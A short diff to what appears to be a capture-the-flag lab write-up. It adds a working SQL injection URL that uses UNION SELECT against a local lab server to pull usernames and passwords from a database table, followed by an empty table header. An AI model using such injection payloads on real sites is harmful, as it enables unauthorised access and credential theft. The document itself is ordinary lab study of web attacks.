@@ -1,6 +1,8 @@
-I don't know if this is a flag or a part of one.
 
 From my work on the userTableSQLInjectionFlag, i exported the table named db_default :
+
+For this db export, try this URL :
+http://192.168.0.18/index.php?page=member&id=2%20UNION%20SELECT%20username,%20password%20FROM%20Member_Brute_Force.db_default&Submit=Submit
 
 | id | username | password |
 | --- | --- | --- |
